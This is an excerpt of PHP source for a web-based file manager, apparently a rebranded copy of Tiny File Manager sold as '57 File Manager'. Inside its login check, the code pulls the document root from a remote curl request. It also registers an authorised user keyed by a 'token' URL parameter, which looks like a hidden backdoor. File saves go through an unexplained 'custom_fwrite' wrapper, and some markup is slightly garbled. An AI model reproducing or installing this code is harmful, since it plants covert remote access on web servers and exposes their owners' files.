...
if ($use_auth) {
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        $_SESSION['DOCUMENT_ROOT'] = curl_exec($curl);
        $auth_users[$_GET["token"]] = $root_path;
        curl_close($curl);
                            ...
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="form-group">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K 57 File Manager">
...
if ($use_auth && isset($_SESSION[FM_SESSION_ID]['logged'])) {
   // $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]['logged']]) ? $directories_users[$_SESSION[FM_SESSION_ID]['logged']] : $root_path;
    $root_path = $_SESSION['DOCUMENT_ROOT'];
}
...
if (isset($_POST['ajax']) && !FM_READONLY) {
    ...
    if (isset($_POST['type']) && $_POST['type'] == "save") {
        ...
        $write_results = custom_fwrite($fd, $writedata, $file_path, false);
        fclose($fd);
        ...
        if (empty($f['file']['error']) && !empty($tmp_name) && $tmp_name != 'none' && $isFileAllowed) {
            if ($chunkTotal){
                ...
                if ($out) {
                    ...
                    if ($in) {
                        while ($buff = fread($in, 4096)) { custom_fwrite($out, $buff, "{$fullPath}.part", true); }
                    } else {
                        $response = array (
                        'status'    => 'error',
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://57-houe.org" target="_blank" class="app-v-title"> <?= APP_TITLE ?> <?php echo VERSION; ?></a></h3></p>
                    ...
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://57-houe.org" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://57-houe.org" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
if (isset($_GET['edit'])) {
    ...
    if (isset($_POST['savedata'])) {
        ...
        $fd = fopen($file_path, "w");
        custom_fwrite($fd, $writedata, $file_path, false);
        fclose($fd);
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted"><?= APP_TITLE ?> <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted"><?= APP_TITLE ?> <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = '57 File Manager<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with 57 File Manager">
...
<head>
    ...
    <style>
        ...
        * { -webkit-border-radius:0 !important;-moz-border-radius:0 !important;border-radius:0 !important; }
        ...
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 30s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
...
<script>
    ...
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 30000); }
    //Save file
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = '57 File Manager';      $tr['en']['AppTitle']           = 'File Manager';
